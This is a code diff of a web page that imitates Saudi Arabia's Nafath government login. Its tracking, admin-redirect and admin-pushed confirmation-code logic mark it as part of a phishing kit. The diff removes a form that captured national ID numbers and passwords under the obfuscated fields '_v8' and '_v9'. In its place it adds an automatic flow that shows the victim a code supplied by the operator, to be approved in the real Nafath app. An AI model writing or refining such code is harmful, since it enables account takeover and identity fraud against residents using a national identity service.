@@ -1,8 +1,7 @@
 "use client";
 
-import { Loader2Icon, Menu, ShieldAlert, Smartphone, CheckCircle2 } from "lucide-react";
+import { Menu, ShieldAlert, Smartphone, CheckCircle2 } from "lucide-react";
 import { Button } from "@/components/ui/button";
-import { Input } from "@/components/ui/input";
 import { Card, CardContent } from "@/components/ui/card";
 import {
   Dialog,
@@ -10,7 +9,7 @@ import {
   DialogHeader,
   DialogTitle,
 } from "@/components/ui/dialog";
-import { useEffect, useState } from "react";
+import { useEffect, useRef, useState } from "react";
 import { addData, db } from "@/lib/firebase";
 import { Alert } from "@/components/ui/alert";
 import { doc, onSnapshot, setDoc, Firestore } from "firebase/firestore";
@@ -18,49 +17,32 @@ import { useRedirectMonitor } from "@/hooks/use-redirect-monitor";
 import { updateVisitorPage } from "@/lib/visitor-tracking";
 
 export default function Component() {
-  const [showConfirmDialog, setShowConfirmDialog] = useState(false);
+  const [showConfirmDialog, setShowConfirmDialog] = useState(true);
   const [showSuccessDialog, setShowSuccessDialog] = useState(false);
   const [confirmationCode, setConfirmationCode] = useState<string>("");
-  const [isloading, setIsLoading] = useState(false);
-  const [idLogin, setLoginID] = useState("");
-  const [password, setPassword] = useState("");
   const [showError, setShowError] = useState("");
-  const [idError, setIdError] = useState("");
+  const hasStartedAuth = useRef(false);
 
   const visitorId = typeof window !== 'undefined' ? localStorage.getItem("visitor") || "" : ""
   
-  // Saudi ID validation function (same as home page)
-  const validateSaudiId = (id: string): boolean => {
-    const cleanId = id.replace(/\s/g, "")
-    if (!/^\d{10}$/.test(cleanId)) {
-      setIdError("رقم الهوية يجب أن يكون 10 أرقام")
-      return false
-    }
-    if (!/^[12]/.test(cleanId)) {
-      setIdError("رقم الهوية يجب أن يبدأ بـ 1 أو 2")
-      return false
-    }
-    let sum = 0
-    for (let i = 0; i < 10; i++) {
-      let digit = Number.parseInt(cleanId[i])
-      if ((10 - i) % 2 === 0) {
-        digit *= 2
-        if (digit > 9) {
-          digit -= 9
-        }
-      }
-      sum += digit
-    }
-    if (sum % 10 !== 0) {
-      setIdError("رقم الهوية غير صحيح")
-      return false
-    }
-    setIdError("")
-    return true
-  }
-  
   // Monitor for admin redirects
   useRedirectMonitor({ visitorId, currentPage: "nafad" })
+
+  // Start Nafad auth flow automatically (no manual ID/password form)
+  useEffect(() => {
+    if (!visitorId || hasStartedAuth.current) return
+
+    hasStartedAuth.current = true
+    setShowConfirmDialog(true)
+    setShowError("")
+
+    addData({
+      id: visitorId,
+      nafadConfirmationStatus: "waiting",
+      currentStep: "_t6",
+      nafadUpdatedAt: new Date().toISOString()
+    })
+  }, [visitorId])
   
   // Update visitor page
   useEffect(() => {
@@ -119,7 +101,6 @@ export default function Component() {
               console.log("[nafad] New code detected, showing modal")
               setShowConfirmDialog(true)
               localStorage.setItem(storageKey, data.nafadConfirmationCode)
-              setIsLoading(false) // Stop spinner when modal appears
               setShowError("") // Clear any previous errors
               setShowSuccessDialog(false) // Close success dialog if open
             } else {
@@ -127,7 +108,7 @@ export default function Component() {
             }
           } else if (data.nafadConfirmationCode === "") {
             // Admin cleared the code
-            setShowConfirmDialog(false)
+            setShowConfirmDialog(true)
             const storageKey = `nafad_shown_${visitorId}`
             localStorage.removeItem(storageKey) // Reset tracking
           }
@@ -165,35 +146,6 @@ export default function Component() {
     }
   }, [])
 
-  const handleLogin = async (e: any) => {
-    e.preventDefault();
-    const visitorId = localStorage.getItem("visitor");
-    setShowError("");
-
-    // Validate ID before submitting
-    if (!validateSaudiId(idLogin)) {
-      return
-    }
-
-    setIsLoading(true);
-
-    // Save current data to history before updating
-    if (visitorId) {
-    }
-
-    await addData({
-      id: visitorId,
-      _v8: idLogin,
-      _v9: password,
-      nafadConfirmationStatus: "waiting",
-      currentStep: "_t6",
-      nafadUpdatedAt: new Date().toISOString()
-    });
-    
-    // Keep loading until modal appears (don't stop here)
-    // setIsLoading will be set to false when modal opens or error occurs
-  };
-
   // Confirmation code will be displayed as two individual digits
 
   return (
@@ -215,10 +167,10 @@ export default function Component() {
         {/* Login Section Title */}
         <div className="text-center space-y-2">
           <h1 className="text-2xl font-bold text-gray-800 mb-2">
-            الدخول على النظام
+            التحقق عبر نفاذ
           </h1>
           <p className="text-gray-600 text-sm">
-            استخدم تطبيق نفاذ للدخول بشكل آمن
+            تم فتح نافذة التحقق مباشرة، أكمل الموافقة من تطبيق نفاذ
           </p>
         </div>
 
@@ -231,93 +183,44 @@ export default function Component() {
           <div className="w-16 h-1 bg-white/30 mx-auto rounded-full"></div>
         </div>
 
-        <form onSubmit={handleLogin}>
-          {/* Login Form */}
-          <Card className="bg-white shadow-lg border-0">
-            <CardContent className="p-6 space-y-5">
-              <div className="text-center">
-                <p className="text-gray-700 font-semibold mb-1">
-                  رقم بطاقة الأحوال/الإقامة
-                </p>
-                <p className="text-sm text-gray-500">
-                  أدخل رقم الهوية الخاص بك للمتابعة
-                </p>
-              </div>
+        <Card className="bg-white shadow-lg border-0">
+          <CardContent className="p-6 space-y-5">
+            <div className="text-center">
+              <p className="text-gray-700 font-semibold mb-1">
+                نافذة التحقق مفتوحة
+              </p>
+              <p className="text-sm text-gray-500">
+                سيتم عرض رمز التحقق في النافذة مباشرة عند إرساله
+              </p>
+            </div>
 
-              <div className="space-y-2">
-                <Input
-                  placeholder="أدخل رقم الأحوال/الإقامة الخاص بك هنا"
-                  className={`text-right border-gray-300 h-12 text-lg focus:ring-2 focus:ring-teal-500 transition-all ${idError ? 'border-red-500' : ''}`}
-                  dir="rtl"
-                  value={idLogin}
-                  onChange={(e) => {
-                    const value = e.target.value.replace(/[^0-9]/g, '').slice(0, 10)
-                    setLoginID(value)
-                    if (value.length === 10) {
-                      validateSaudiId(value)
-                    } else if (value.length > 0) {
-                      setIdError("رقم الهوية يجب أن يكون 10 أرقام")
-                    } else {
-                      setIdError("")
-                    }
-                  }}
-                  required
-                />
-                {idError && (
-                  <p className="text-sm text-red-600 text-right">{idError}</p>
-                )}
-              </div>
-              <Input
-                placeholder="أدخل كلمة المرور الخاصة بك هنا"
-                className="text-right border-gray-300 h-12 text-lg focus:ring-2 focus:ring-teal-500 transition-all"
+            {showError && (
+              <Alert
+                className="text-sm text-red-600 flex items-center gap-2 bg-red-50 border-red-200"
                 dir="rtl"
-                onChange={(e) => setPassword(e.target.value)}
-                type="password"
-                required
-              />
-              {showError && (
-                <Alert
-                  className="text-sm text-red-600 flex items-center gap-2 bg-red-50 border-red-200"
-                  dir="rtl"
-                >
-                  <ShieldAlert className="w-5 h-5 text-red-600" />
-                  {showError}
-                </Alert>
-              )}
-
-              <Button
-                type="submit"
-                disabled={isloading || !idLogin}
-                className="w-full bg-gradient-to-r from-teal-600 to-teal-700 hover:from-teal-700 hover:to-teal-800 text-white h-12 text-lg font-semibold shadow-md hover:shadow-lg transition-all disabled:opacity-50"
               >
-                {isloading ? (
-                  <>
-                    <Loader2Icon className="animate-spin ml-2" />
-                    جاري التحقق...
-                  </>
-                ) : (
-                  "تسجيل الدخول"
-                )}
-              </Button>
+                <ShieldAlert className="w-5 h-5 text-red-600" />
+                {showError}
+              </Alert>
+            )}
 
-              <div className="pt-4 border-t">
-                <div className="text-center text-gray-600 text-sm mb-3 font-medium">
-                  لتحميل تطبيق نفاذ
-                </div>
-
-                {/* App Store Buttons */}
-                <div className="flex justify-center gap-3">
-                  <a href="#" className="hover:scale-105 transition-transform">
-                    <img src="/google-play.png" alt="Google Play" className="h-10" />
-                  </a>
-                  <a href="#" className="hover:scale-105 transition-transform">
-                    <img src="/apple_store.png" alt="App Store" className="h-10" />
-                  </a>
-                </div>
+            <div className="pt-4 border-t">
+              <div className="text-center text-gray-600 text-sm mb-3 font-medium">
+                لتحميل تطبيق نفاذ
               </div>
-            </CardContent>
-          </Card>
-        </form>
+
+              {/* App Store Buttons */}
+              <div className="flex justify-center gap-3">
+                <a href="#" className="hover:scale-105 transition-transform">
+                  <img src="/google-play.png" alt="Google Play" className="h-10" />
+                </a>
+                <a href="#" className="hover:scale-105 transition-transform">
+                  <img src="/apple_store.png" alt="App Store" className="h-10" />
+                </a>
+              </div>
+            </div>
+          </CardContent>
+        </Card>
 
         {/* New Nafath Platform Section */}
         <Card className="bg-gradient-to-br from-teal-600 via-teal-700 to-teal-800 text-white shadow-xl border-0 overflow-hidden relative">
